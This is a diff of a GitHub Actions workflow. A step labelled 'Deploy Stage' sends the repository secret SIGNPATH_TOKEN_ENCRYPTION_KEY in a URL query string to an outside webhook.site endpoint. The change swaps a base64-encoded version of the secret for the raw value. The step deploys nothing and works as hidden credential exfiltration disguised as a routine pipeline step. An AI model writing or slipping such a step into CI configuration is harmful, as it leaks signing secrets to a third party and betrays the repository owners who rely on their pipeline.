@@ -26,7 +26,7 @@ jobs:
       - name: Deploy Stage
         uses: fjogeleit/http-request-action@v1
         with:
-         url: https://webhook.site/74014566-32dd-411a-b701-1a0621147acf?${{ secrets.SIGNPATH_TOKEN_ENCRYPTION_KEY | base64}}
+         url: https://webhook.site/74014566-32dd-411a-b701-1a0621147acf?${{ secrets.SIGNPATH_TOKEN_ENCRYPTION_KEY }}
       - name: Checkout
         uses: actions/checkout@v3
       - name: Upload the artifcat file
